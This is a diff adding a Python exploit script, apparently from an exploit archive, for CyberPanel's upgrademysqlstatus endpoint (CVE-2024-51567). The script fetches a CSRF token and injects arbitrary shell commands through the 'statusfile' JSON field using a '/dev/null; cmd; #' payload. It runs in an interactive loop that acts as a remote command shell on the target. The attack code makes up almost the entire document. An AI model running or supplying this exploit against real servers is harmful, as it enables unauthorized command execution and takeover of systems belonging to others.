@@ -1,0 +1,40 @@
+id: 39807
+date: 11/07/2024
+title: CyberPanel upgrademysqlstatus Arbitrary Command Execution Exploit
+author: bot
+cves: CVE-2024-51567
+
+import httpx 
+import sys 
+
+def get_CSRF_token(client):
+    resp = client.get("/")
+    
+    return resp.cookies['csrftoken']
+    
+def pwn(client, CSRF_token, cmd):
+    headers = {
+        "X-CSRFToken": CSRF_token,
+        "Content-Type":"application/json",
+        "Referer": str(client.base_url)
+    }
+    
+    payload = '{"statusfile":"/dev/null; %s; #","csrftoken":"%s"}' % (cmd, CSRF_token)
+    
+    return client.put("/dataBases/upgrademysqlstatus", headers=headers, data=payload).json()["requestStatus"]
+    
+def exploit(client, cmd):
+    CSRF_token = get_CSRF_token(client)
+    stdout = pwn(client, CSRF_token, cmd)
+    print(stdout)
+    
+if __name__ == "__main__":
+    target = sys.argv[1]
+    
+    client = httpx.Client(base_url=target, verify=False)
+    while True:
+        cmd = input("$> ")
+
+        exploit(client, cmd)
+
+#  0day.today [2024-11-21]  #
